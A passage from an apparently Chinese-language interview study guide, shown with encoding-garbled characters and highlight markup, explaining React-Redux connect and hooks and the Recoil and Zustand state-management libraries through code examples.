class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">todo</span>=<span class="hljs-string">&#123;todo&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">onToggle</span>=<span class="hljs-string">&#123;handleToggle&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="connect-é«˜é˜¶ç»„ä»¶ï¼ˆä¼ ç»Ÿå†™æ³•ï¼‰"><a href="#connect-é«˜é˜¶ç»„ä»¶ï¼ˆä¼ ç»Ÿå†™æ³•ï¼‰" class="headerlink" title="connect é«˜é˜¶ç»„ä»¶ï¼ˆä¼ ç»Ÿå†™æ³•ï¼‰"></a>connect é«˜é˜¶ç»„ä»¶ï¼ˆä¼ ç»Ÿå†™æ³•ï¼‰</h3><p><strong>mapStateToProps</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">mapStateToProps</span> = (<span class="hljs-params">state, ownProps</span>) =&gt; (&#123;<br>  <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>,<br>  <span class="hljs-attr">currentUser</span>: state.<span class="hljs-property">users</span>[ownProps.<span class="hljs-property">userId</span>]<br>&#125;);<br><br><span class="hljs-comment">// ç»„ä»¶ä¸­é€šè¿‡ props è®¿é—®</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params">&#123; todos, currentUser &#125;</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>mapDispatchToProps</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¯¹è±¡ç®€å†™ï¼ˆè‡ªåŠ¨ç»‘å®š dispatchï¼‰</span><br><span class="hljs-keyword">const</span> mapDispatchToProps = &#123;<br>  addTodo,<br>  deleteTodo<br>&#125;;<br><br><span class="hljs-comment">// å‡½æ•°å½¢å¼</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">mapDispatchToProps</span> = (<span class="hljs-params">dispatch</span>) =&gt; (&#123;<br>  <span class="hljs-attr">addTodo</span>: <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(text)),<br>  <span class="hljs-attr">deleteTodo</span>: <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">deleteTodo</span>(id))<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>connect ä½¿ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; connect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ConnectedTodoList</span> = <span class="hljs-title function_">connect</span>(<br>  mapStateToProps,<br>  mapDispatchToProps<br>)(<span class="hljs-title class_">TodoList</span>);<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-14"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-14" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆéœ€è¦ React-Reduxï¼Ÿ</strong></p><ol><li>è§£è€¦ç»„ä»¶ï¼šé¿å…ç»„ä»¶ç›´æ¥ä¾èµ– Redux store</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šè‡ªåŠ¨å®ç° shouldComponentUpdate ä¼˜åŒ–</li><li>ä¸Šä¸‹æ–‡ç®¡ç†ï¼šé€šè¿‡ Provider ä¼˜é›…æ³¨å…¥ store</li><li>ç®€åŒ–å¼€å‘ï¼šæä¾› useSelector&#x2F;useDispatch ä¾¿æ· API</li><li>æœªæ¥å…¼å®¹ï¼šå®˜æ–¹ç»´æŠ¤ï¼Œä¿è¯ä¸ React æ–°ç‰¹æ€§å…¼å®¹</li></ol><p><strong>Qï¼šuseSelector å¦‚ä½•é¿å…ä¸å¿…è¦é‡æ¸²æŸ“ï¼Ÿ</strong></p><p>ä¼˜åŒ–ç­–ç•¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç­–ç•¥1ï¼šè¿”å›åŸå§‹å€¼ï¼ˆéå¼•ç”¨ç±»å‹ï¼‰</span><br><span class="hljs-keyword">const</span> count = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">counter</span>); <span class="hljs-comment">// number</span><br><br><span class="hljs-comment">// ç­–ç•¥2ï¼šä½¿ç”¨æµ…æ¯”è¾ƒ</span><br><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>, shallowEqual);<br><br><span class="hljs-comment">// ç­–ç•¥3ï¼šè®°å¿†åŒ–é€‰æ‹©å™¨</span><br><span class="hljs-keyword">const</span> selectUser = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123; <span class="hljs-attr">name</span>: state.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>, <span class="hljs-attr">id</span>: state.<span class="hljs-property">user</span>.<span class="hljs-property">id</span> &#125;), <br>  []<br>);<br><span class="hljs-keyword">const</span> userInfo = <span class="hljs-title function_">useSelector</span>(selectUser);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¦‚ä½•åœ¨ç±»ç»„ä»¶ä¸­ä½¿ç”¨ Hooksï¼Ÿ</strong></p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºè¿æ¥ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">withReduxHooks</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">data</span>);<br>    <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...props</span>&#125; <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> <span class="hljs-attr">dispatch</span>=<span class="hljs-string">&#123;dispatch&#125;</span> /&gt;</span></span>;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LegacyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-comment">// é€šè¿‡ props è®¿é—® data å’Œ dispatch</span><br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">withReduxHooks</span>(<span class="hljs-title class_">LegacyComponent</span>);<br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“ï¼šReact-Redux-æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ€»ç»“ï¼šReact-Redux-æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ€»ç»“ï¼šReact-Redux æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ€»ç»“ï¼šReact-Redux æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><table><thead><tr><th align="left">æ¦‚å¿µ</th><th align="left">ä½œç”¨</th><th align="left">æœ€ä½³å®è·µ</th></tr></thead><tbody><tr><td align="left">Provider</td><td align="left">æ³¨å…¥ Redux store åˆ°ç»„ä»¶æ ‘</td><td align="left">åŒ…è£¹æ•´ä¸ªåº”ç”¨æ ¹ç»„ä»¶</td></tr><tr><td align="left">useSelector</td><td align="left">ä» store é€‰æ‹©çŠ¶æ€</td><td align="left">è¿”å›åŸå§‹å€¼ + ç²¾ç»†é€‰æ‹©</td></tr><tr><td align="left">useDispatch</td><td align="left">è·å– dispatch æ–¹æ³•</td><td align="left">å°è£…åŠ¨ä½œåˆ›å»ºå‡½æ•°</td></tr><tr><td align="left">connect</td><td align="left">ç±»ç»„ä»¶è¿æ¥æ–¹æ¡ˆï¼ˆä¼ ç»Ÿï¼‰</td><td align="left">ä½¿ç”¨ mapState&#x2F;mapDispatch</td></tr><tr><td align="left">è®°å¿†åŒ–é€‰æ‹©å™¨</td><td align="left">ä¼˜åŒ–æ€§èƒ½</td><td align="left">ä½¿ç”¨ reselect æˆ– useMemo</td></tr><tr><td align="left">Redux Toolkit</td><td align="left">ç°ä»£ Redux å¼€å‘æ ‡å‡†</td><td align="left">ä½¿ç”¨ createSlice + configureStore</td></tr></tbody></table><h2 id="5-5-ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆï¼ˆRecoilã€Zustandã€Jotaiï¼‰"><a href="#5-5-ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆï¼ˆRecoilã€Zustandã€Jotaiï¼‰" class="headerlink" title="5.5 ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆï¼ˆRecoilã€Zustandã€Jotaiï¼‰"></a>5.5 ç°ä»£çŠ¶æ€ç®¡ç†æ–¹æ¡ˆï¼ˆRecoilã€Zustandã€Jotaiï¼‰</h2><h3 id="åŸºç¡€çŸ¥è¯†æ¦‚è¿°-ç®€è¦"><a href="#åŸºç¡€çŸ¥è¯†æ¦‚è¿°-ç®€è¦" class="headerlink" title="åŸºç¡€çŸ¥è¯†æ¦‚è¿° (ç®€è¦)"></a>åŸºç¡€çŸ¥è¯†æ¦‚è¿° (ç®€è¦)</h3><p>ç›®æ ‡ï¼š è§£å†³ React åº”ç”¨ä¸­è·¨ç»„ä»¶çŠ¶æ€å…±äº«å’Œå¤æ‚çŠ¶æ€é€»è¾‘çš„ç®¡ç†é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å½“ Context + useState&#x2F;useReducer åœ¨æ€§èƒ½æˆ–å¼€å‘ä½“éªŒä¸Šæ˜¾å¾—ä¸è¶³æ—¶ã€‚</p><p>æ ¸å¿ƒè¯‰æ±‚ï¼š</p><ul><li>ç®€åŒ– APIï¼š å‡å°‘æ¨¡æ¿ä»£ç ï¼ˆboilerplateï¼‰ï¼Œæå‡å¼€å‘æ•ˆç‡ã€‚</li><li>é«˜æ€§èƒ½æ›´æ–°ï¼š ç²¾ç¡®æ§åˆ¶ç»„ä»¶æ›´æ–°èŒƒå›´ï¼Œé¿å…ä¸å¿…è¦çš„æ¸²æŸ“ã€‚</li><li>æ›´å¥½çš„ TypeScript æ”¯æŒï¼š æä¾›å‡ºè‰²çš„ç±»å‹æ¨æ–­ã€‚</li><li>æ›´è‡ªç„¶çš„ React é›†æˆï¼š æ‹¥æŠ± Hooks å’Œ React çš„å¹¶å‘ç‰¹æ€§ã€‚</li><li>æ›´å°çš„åŒ…ä½“ç§¯ï¼š å‡å°åº”ç”¨ä½“ç§¯ã€‚</li></ul><p>ä¸ Redux çš„ä¸»è¦åŒºåˆ«ï¼š</p><ul><li>é€šå¸¸ä¸éœ€è¦æ˜¾å¼å®šä¹‰ action types, action creators, reducersã€‚</li><li>çŠ¶æ€å­˜å‚¨å’Œæ›´æ–°é€»è¾‘æ›´åˆ†æ•£æˆ–åŸå­åŒ–ã€‚</li><li>API è®¾è®¡æ›´è´´è¿‘ React Hooksï¼Œå­¦ä¹ æ›²çº¿ç›¸å¯¹å¹³ç¼“ã€‚</li></ul><h3 id="Recoil-Meta-å®˜æ–¹å‡ºå“"><a href="#Recoil-Meta-å®˜æ–¹å‡ºå“" class="headerlink" title="Recoil (Meta å®˜æ–¹å‡ºå“)"></a>Recoil (Meta å®˜æ–¹å‡ºå“)</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µï¼š åŸå­ (Atoms) å’Œ é€‰æ‹©å™¨ (Selectors)</strong></p><ul><li>Atom: çŠ¶æ€çš„æœ€å°å•ä½ã€‚ä¸€ä¸ªåŸå­ä»£è¡¨ä¸€ä»½ç‹¬ç«‹çš„çŠ¶æ€ï¼ˆå¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼‰ã€‚ç»„ä»¶é€šè¿‡ useRecoilState, useRecoilValue, useSetRecoilState è®¢é˜…æˆ–æ›´æ–°å®ƒã€‚åŸå­å˜åŒ–åªè§¦å‘è®¢é˜…å®ƒçš„ç»„ä»¶é‡æ¸²æŸ“ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; atom &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;recoil&#x27;</span>;<br><span class="hljs-keyword">const</span> countState = <span class="hljs-title function_">atom</span>(&#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;countState&#x27;</span>, <span class="hljs-comment">// å¿…é¡»å…¨å±€å”¯ä¸€</span><br>  <span class="hljs-attr">default</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// åˆå§‹å€¼</span><br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>Selector: æ´¾ç”ŸçŠ¶æ€ã€‚åŸºäºä¸€ä¸ªæˆ–å¤šä¸ª Atom æˆ–å…¶ä»– Selector çš„å€¼é€šè¿‡çº¯å‡½æ•°è®¡ç®—å¾—å‡ºã€‚ç»„ä»¶åŒæ ·ä½¿ç”¨ Hook è®¢é˜…ã€‚ä¾èµ–çš„ Atom&#x2F;Selector å˜åŒ–æ—¶è‡ªåŠ¨é‡æ–°è®¡ç®—ï¼Œå¹¶è§¦å‘è®¢é˜…ç»„ä»¶æ›´æ–°ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; selector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;recoil&#x27;</span>;<br><span class="hljs-keyword">const</span> doubledCountState = <span class="hljs-title function_">selector</span>(&#123;<br>  <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;doubledCountState&#x27;</span>,<br>  <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">&#123; get &#125;</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">get</span>(countState);<br>    <span class="hljs-keyword">return</span> count * <span class="hljs-number">2</span>;<br>  &#125;,<br>  <span class="hljs-comment">// å¯é€‰ï¼šå®šä¹‰å¦‚ä½•è®¾ç½®ï¼ˆä¼šåå‘æ›´æ–°ä¾èµ–çš„ Atomï¼‰</span><br>  <span class="hljs-attr">set</span>: <span class="hljs-function">(<span class="hljs-params">&#123; set &#125;, newValue</span>) =&gt;</span> &#123;<br>    <span class="hljs-title function_">set</span>(countState, newValue / <span class="hljs-number">2</span>);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Hooks API:</strong></p><ul><li>useRecoilState(atom&#x2F;selector)ï¼š ç±»ä¼¼äº useStateï¼Œè¿”å› [state, setter]ã€‚</li><li>useRecoilValue(atom&#x2F;selector)ï¼š åªè¯»å–çŠ¶æ€å€¼ã€‚</li><li>useSetRecoilState(atom&#x2F;selector)ï¼š åªè·å–è®¾ç½®çŠ¶æ€çš„å‡½æ•°ã€‚</li><li>useRecoilCallback()ï¼š ç”¨äºåœ¨å›è°ƒä¸­å¼‚æ­¥è¯»å–&#x2F;æ›´æ–°çŠ¶æ€ï¼Œé¿å…é—­åŒ…é—®é¢˜ã€‚</li></ul><p><strong>å…³é”®ç‰¹æ€§</strong></p><ul><li>ç»†ç²’åº¦å“åº”ï¼š ç»„ä»¶åªè®¢é˜…å®ƒçœŸæ­£éœ€è¦çš„å…·ä½“ Atom&#x2F;Selectorï¼ŒçŠ¶æ€å˜åŒ–æ—¶åªæœ‰ä¾èµ–è¿™äº›çŠ¶æ€çš„ç»„ä»¶æ‰ä¼šæ›´æ–°ã€‚è¿™æ˜¯è§£å†³ Redux ä¸­ connect æˆ– useSelector å¯èƒ½å¯¼è‡´çš„â€œå¤§èŒƒå›´æ›´æ–°â€é—®é¢˜çš„å…³é”®ã€‚</li><li>Hooks-First APIï¼š å®Œå…¨ä½¿ç”¨ React Hooks çš„æ–¹å¼è¯»å–å’Œä¿®æ”¹çŠ¶æ€ï¼Œä¸å‡½æ•°ç»„ä»¶æ— ç¼é›†æˆã€‚</li><li>å¼‚æ­¥æ”¯æŒï¼š Selector å¯ä»¥æ–¹ä¾¿åœ°å¤„ç†å¼‚æ­¥æ•°æ®è·å–å’Œæ´¾ç”ŸçŠ¶æ€ï¼ˆå¦‚ useRecoilValueLoadableï¼‰ã€‚</li><li>çŠ¶æ€å¿«ç…§ä¸æ—¶é—´æ—…è¡Œï¼š å†…ç½®æ”¯æŒçŠ¶æ€å¿«ç…§ï¼Œä¾¿äºè°ƒè¯•ï¼ˆå¦‚ <RecoilRoot> çš„ initializeState å’Œå¿«ç…§ APIï¼‰ã€‚</li></ul><p><strong>ä¼˜ç‚¹</strong></p><ul><li>æ¦‚å¿µç›¸å¯¹æ¸…æ™°ï¼ˆAtom&#x2F;Selectorï¼‰ã€‚</li><li>ç»†ç²’åº¦æ›´æ–°æ€§èƒ½ä¼˜ç§€ã€‚</li><li>å®˜æ–¹èƒŒæ™¯ï¼Œç¤¾åŒºå’Œæ–‡æ¡£è¾ƒå¥½ã€‚</li><li>å†…ç½®å¼‚æ­¥æ”¯æŒè‰¯å¥½ã€‚</li></ul><p><strong>ç¼ºç‚¹&#x2F;è€ƒé‡</strong></p><ul><li>API ç›¸å¯¹å¤æ‚ï¼š ç†è§£ Atomã€Selector åŠå…¶å„ç§ Hookï¼ˆuseRecoilCallback, useRecoilValueLoadable, useRecoilTransaction_UNSTABLE ç­‰ï¼‰éœ€è¦ä¸€å®šå­¦ä¹ æˆæœ¬ã€‚</li><li>ä»åœ¨å®éªŒé˜¶æ®µ (Experimental)ï¼š è™½ç„¶ Meta å†…éƒ¨å¹¿æ³›ä½¿ç”¨ï¼Œä½†å®˜æ–¹æ–‡æ¡£ä»æ ‡è®°ä¸º Experimentalï¼ŒAPI ç¨³å®šæ€§æœ‰ä¸€å®šé£é™©ï¼ˆå°½ç®¡é‡å¤§å˜æ›´å·²è¾ƒå°‘ï¼‰ã€‚</li><li>Bundle Sizeï¼š ç›¸å¯¹å…¶ä»–è½»é‡æ–¹æ¡ˆç¨å¤§ã€‚</li></ul><p><strong>é¢è¯•è¦ç‚¹</strong></p><ul><li>è§£é‡Š Atom å’Œ Selector çš„åŒºåˆ«å’Œè”ç³»ã€‚</li><li>å¦‚ä½•ç”¨ Selector å¤„ç†å¼‚æ­¥æ•°æ®ï¼Ÿ</li><li>Recoil å¦‚ä½•å®ç°ç»†ç²’åº¦æ›´æ–°ï¼Ÿï¼ˆä¾èµ–å›¾è¿½è¸ªï¼‰</li><li>å¯¹æ¯” Recoil ä¸ Context + useState&#x2F;useReducer åœ¨æ€§èƒ½ä¸Šçš„å·®å¼‚ï¼ˆContext æ›´æ–°ä¼šè§¦å‘æ‰€æœ‰æ¶ˆè´¹ç»„ä»¶æ›´æ–°ï¼ŒRecoil åªæ›´æ–°ä¾èµ–ç‰¹å®š Atom&#x2F;Selector çš„ç»„ä»¶ï¼‰ã€‚</li><li>äº†è§£ atomFamily &#x2F; selectorFamily çš„ä½œç”¨ï¼ˆå‚æ•°åŒ–çŠ¶æ€ï¼‰ã€‚</li></ul><h3 id="Zustand"><a href="#Zustand" class="headerlink" title="Zustand"></a>Zustand</h3><p><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šåˆ›å»ºä¸€ä¸ªå•ä¸€çš„ã€ä¸å¯å˜çš„ Storeã€‚Store åŒ…å«çŠ¶æ€å’Œä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•ï¼ˆActionï¼‰ã€‚API æå…¶ç®€æ´ã€‚</p><p><strong>æ ¸å¿ƒ APIï¼ˆcreateï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> create <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;zustand&#x27;</span>;<br><span class="hljs-comment">// ç±»å‹æç¤º (TypeScript): import &#123; create &#125; from &#x27;zustand&#x27;</span><br><span class="hljs-keyword">const</span> useStore = <span class="hljs-title function_">create</span>(<span class="hljs-function">(<span class="hljs-params">set, get</span>) =&gt;</span> (&#123;<br>  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> (&#123; <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;)),<br>  <span class="hljs-attr">decrement</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> (&#123; <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> &#125;)),<br>  <span class="hljs-attr">reset</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> &#125;),<br>  <span class="hljs-comment">// è®¿é—®å½“å‰çŠ¶æ€ (éæ›´æ–°æ—¶): get().count</span><br>  <span class="hljs-comment">// å¼‚æ­¥ Action ç¤ºä¾‹</span><br>  <span class="hljs-keyword">async</span> <span class="hljs-attr">fetchData</span>: <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>);<br>    <span class="hljs-title function_">set</span>(&#123; <span class="hljs-attr">data</span>: <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>() &#125;); <span class="hljs-comment">// æ›´æ–°çŠ¶æ€</span><br>  &#125;<br>&#125;));<br></code></pre></td></tr></table></figure><p><strong>Hooks API</strong></p><ul><li>useStore()ï¼š é»˜è®¤ä¼šè®¢é˜…æ•´ä¸ª Store çš„å˜åŒ–ï¼ˆä¸æ¨èï¼Œå¯èƒ½å¯¼è‡´è¿‡å¤šæ¸²æŸ“ï¼‰ã€‚</li><li>useStore(selector)ï¼š æ¨èç”¨æ³•ã€‚é€šè¿‡ä¸€ä¸ªé€‰æ‹©å™¨å‡½æ•°ä» Store ä¸­é€‰å–éœ€è¦çš„éƒ¨åˆ†çŠ¶æ€æˆ– Actionã€‚ç»„ä»¶åªåœ¨é€‰æ‹©å™¨è¿”å›çš„éƒ¨åˆ†å‘ç”Ÿå˜åŒ–æ—¶æ‰ä¼šé‡æ–°æ¸²æŸ“ã€‚Zustand ä¼šå¯¹é€‰æ‹©å™¨ç»“æœè¿›è¡Œä¸¥æ ¼çš„æµ…æ¯”è¾ƒ (Object.is)ã€‚ä½¿ç”¨é€‰æ‹©å™¨å‡½æ•°æ˜¯æ€§èƒ½ä¼˜åŒ–çš„å…³é”®ã€‚</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç»„ä»¶A: åªéœ€è¦ count å’Œ increment</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; count, increment &#125; = <span class="hljs-title function_">useStore</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> (&#123;<br>    <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span>,<br>    <span class="hljs-attr">increment</span>: state.<span class="hljs-property">increment</span><br>  &#125;));<br>  <span class="hljs-comment">// ... render</span><br>&#125;<br><span class="hljs-comment">// ç»„ä»¶B: åªéœ€è¦ decrement</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">CounterB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> decrement = <span class="hljs-title function_">useStore</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">decrement</span>);<br>  <span class="hljs-comment">// ... render</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®ç‰¹æ€§&#x2F;ä¼˜åŠ¿</strong></p><ul><li>æè‡´ç®€æ´ï¼š API æå…¶ç²¾ç®€ï¼Œå­¦ä¹ æˆæœ¬ä½ï¼Œæ ·æ¿ä»£ç æå°‘ã€‚</li><li>é«˜æ€§èƒ½ï¼š ç²¾ç¡®çš„è®¢é˜…æœºåˆ¶ï¼ˆé€šè¿‡é€‰æ‹©å™¨ï¼‰ç¡®ä¿ç»„ä»¶åªåœ¨ç›¸å…³çŠ¶æ€å˜åŒ–æ—¶æ›´æ–°ã€‚</li><li>æ—  Provider åœ°ç‹±ï¼š Store æ˜¯å…¨å±€å•ä¾‹ï¼ˆè™½ç„¶å¯ä»¥åˆ›å»ºå¤šä¸ª Storeï¼‰ï¼Œä¸éœ€è¦ç”¨ Context Provider åŒ…è£¹åº”ç”¨æ ¹èŠ‚ç‚¹ã€‚ç»„ä»¶å¯ä»¥ç›´æ¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨ useStoreã€‚</li><li>Middleware æ”¯æŒï¼š å†…ç½®æ”¯æŒä¸­é—´ä»¶ï¼ˆå¦‚ persist æŒä¹…åŒ–ã€immer ç®€åŒ–ä¸å¯å˜æ›´æ–°ã€devtools è¿æ¥ Redux DevToolsï¼‰ã€‚</li><li>å‡ºè‰²çš„ TS æ”¯æŒï¼š 